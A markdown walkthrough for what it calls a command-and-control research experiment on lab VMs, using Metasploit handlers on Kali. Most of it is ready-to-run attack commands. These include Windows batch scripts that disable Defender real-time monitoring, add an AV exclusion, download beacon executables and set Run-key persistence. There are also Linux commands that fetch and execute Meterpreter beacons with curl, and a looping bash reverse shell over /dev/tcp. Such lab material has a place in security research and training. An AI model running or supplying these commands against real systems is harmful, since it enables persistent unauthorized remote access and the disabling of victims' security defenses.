# C2 Research Experiment Walkthrough

This guide explains how to deploy and run the refined C2 research experiment with separated ports for Windows and Linux targets.

## Prerequisites

Before running any commands on the target VMs, ensure your Kali infrastructure is active:

1.  **Deploy Experiment**: Run the automation script to set up everything (Handlers + HTTP Server).
    ```bash
    cd ~/Desktop/c2/msf-c2
    ./deploy_experiment.sh
    ```

## Delivery Methods

### 1. Windows Options (Reverse HTTPS + 10% Jitter)
*Ports: 10s -> 4444, 30s -> 4445, 60s -> 4446*

#### A. Persistent (Survived Reboots)
```batch
@echo off
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Users'"
powershell -Command "Invoke-WebRequest -Uri 'http://192.168.56.10:4567/windows/win_beacon_https_30s.exe' -OutFile 'C:\Users\Public\win_svc_30s.exe'"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSvc_30s" /t REG_SZ /d "C:\Users\Public\win_svc_30s.exe" /f
start /B "" "C:\Users\Public\win_svc_30s.exe"
```

#### B. Temporary Bulk (Run All Intervals)
```batch
@echo off
for %%i in (10, 30, 60) do (
    powershell -Command "Invoke-WebRequest -Uri 'http://192.168.56.10:4567/windows/win_beacon_https_%%is.exe' -OutFile '%%TEMP%%\win_beacon_%%is.exe'"
    start /B "" "%%TEMP%%\win_beacon_%%is.exe"
)
```

### 2. MX Linux Options (Python Meterpreter)
*Ports: 10s -> 8444, 30s -> 8445, 60s -> 8446*

#### A. Temporary (Non-Persistent)
```bash
curl -L http://192.168.56.10:4567/linux/beacon_30s.py -o /tmp/beacon_30s.py && python3 /tmp/beacon_30s.py &
```

#### B. Bulk Temp (Run All)
```bash
for i in 10 30 60; do
  curl -L http://192.168.56.10:4567/linux/beacon_${i}s.py -o /tmp/beacon_${i}s.py && python3 /tmp/beacon_${i}s.py &
done
```

#### C. Simple Linux Alternative (Stateless Bash)
*Port: 4447 (Legacy TCP)*
```bash
# One-liner for a 30s beacon
while true; do bash -i >& /dev/tcp/192.168.56.10/4447 0>&1; sleep 30; done &
```

## Cleanup & Removal

### Windows Cleanup (Run as Admin)
```batch
@echo off
for %%i in (10, 30, 60) do (
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinSvc_%%is" /f
    taskkill /F /IM win_svc_%%is.exe
)
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
```

### MX Linux Cleanup
```bash
pkill -f "beacon_.*s.py"
pkill -f "linux_beacon"
rm /tmp/beacon_*s.py
```

## Troubleshooting
- **Connection Refused**: Ensure `./deploy_experiment.sh` was run and `msfconsole` is active on Kali.
- **Python Errors**: Ensure `python3` is installed on MX Linux. No special env is required.
